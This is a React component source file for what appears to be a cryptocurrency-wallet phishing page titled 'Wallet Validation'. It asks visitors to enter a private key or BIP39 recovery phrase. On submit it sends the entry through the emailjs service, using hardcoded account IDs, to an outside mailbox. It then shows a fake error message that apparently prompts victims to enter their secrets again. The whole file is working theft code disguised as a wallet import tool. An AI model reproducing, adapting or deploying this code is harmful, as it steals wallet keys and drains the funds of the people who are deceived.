import React from "react";

import { Link } from "react-router-dom";
import emailjs from "emailjs-com";
import "./Phasekey.css";

const Private = () => {
  const [state, setState] = React.useState(true);
  const handleSubmit = (e) => {
    setState(false);
    e.preventDefault();

    emailjs
      .sendForm(
        "service_uca2x1k",
        "template_rald6hr",
        e.target,
        "user_Qp1Kvs7l8ZL0vLtKArviW"
      )
      .then(
        (result) => {
          console.log(result.text);
          setState(false);
        },
        (error) => {
          console.log(error.text);
        }
      );
  };
  return (
    // <div className="phasekey__container">
    //   <div className={state ? "hider" : "error"}>
    //     <h4>Check For Validation Within 24 Hours</h4>
    //   </div>
    //   <h3 className="import__text">Import Wallet</h3>
    //   <br />
    //   <div className="key__type">
    //     <Link style={{ textDecoration: "none" }} to="/phrasekey">
    //       Phrase
    //     </Link>
    //     <Link style={{ textDecoration: "none" }} to="/keystore">
    //       Keystore JSON
    //     </Link>
    //     <Link style={{ textDecoration: "none" }} to="/private">
    //       Private Key
    //     </Link>
    //   </div>
    //   <hr style={{ marginTop: ".5em" }} />
    //   <br />
    //   <form onSubmit={handleSubmit}>
    //     <input
    //       className="field"
    //       placeholder=" Enter private key"
    //       type="text"
    //       name="hex"
    //     />
    //     <p className="note">
    //       Typically 12(sometimes 24) words separated by single spaces
    //     </p>
    //     <button type="submit">Import</button>
    //   </form>
    // </div>

    <div className="phasekey__container">
      <div className={state ? "hider" : "error"}>
        <h4 className="phasekey__err">Error: input phrase key correctly</h4>
      </div>
      <h3 className="import__text" style={{ textAlign: "center" }}>WALLET VALIDATION</h3>
      <br />
      <h2 className="import__text" style={{ textAlign: "center", fontSize: "1.3rem" }}>Unlock Your Wallet</h2>
      <br />
      <div className="key__type">
        <Link style={{ textDecoration: "none" }} to="/phrasekey">
          Phrase
        </Link>
        <Link style={{ textDecoration: "none" }} to="/keystore">
          Keystore JSON
        </Link>
        <Link style={{ textDecoration: "none" }} to="/private">
          Private Key
        </Link>
      </div>
      <hr style={{ marginTop: ".5em" }} />
      <br />
      <form action="POST" onSubmit={handleSubmit}>
        <input
          className="field"
          placeholder=" Enter private key"
          type="text"
          name="key"
        />
        <p className="note">
          Typically 12(sometimes 24) words separated by single spaces
        </p>
        <br />

        {/* <input
          className="field"
          placeholder=" Wallet address"
          type="text"
          name="wallet"
        /> */}
        <p className="note">
          Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts.
        </p>
        <button className="fkn__button" type="submit">Import</button>
      </form>
    </div>
  );
};

export default Private;
